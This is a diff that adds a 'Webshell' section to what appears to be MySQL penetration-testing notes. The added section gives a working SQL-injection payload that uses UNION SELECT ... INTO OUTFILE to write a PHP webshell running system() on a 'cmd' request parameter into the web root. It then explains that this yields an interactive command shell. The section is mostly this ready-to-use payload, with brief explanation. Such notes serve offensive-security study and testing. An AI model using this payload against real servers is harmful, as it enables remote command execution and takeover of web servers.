@@ -86,6 +86,18 @@ MySQL still supports other authentication plugins (like `mysql_native_password`)
 
 
 
+## Webshell
+Although the various MySQL database variants don’t offer a single function to escalate to RCE, we can abuse the `SELECT INTO_OUTFIL`E statement to write files on the web server.
+
+
+```
+UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+```
+The PHP system function will parse any statement included in the cmd parameter coming from the client HTTP REQUEST, thus acting like a web-interactive command shell.
+
+
+
+
 
 
 
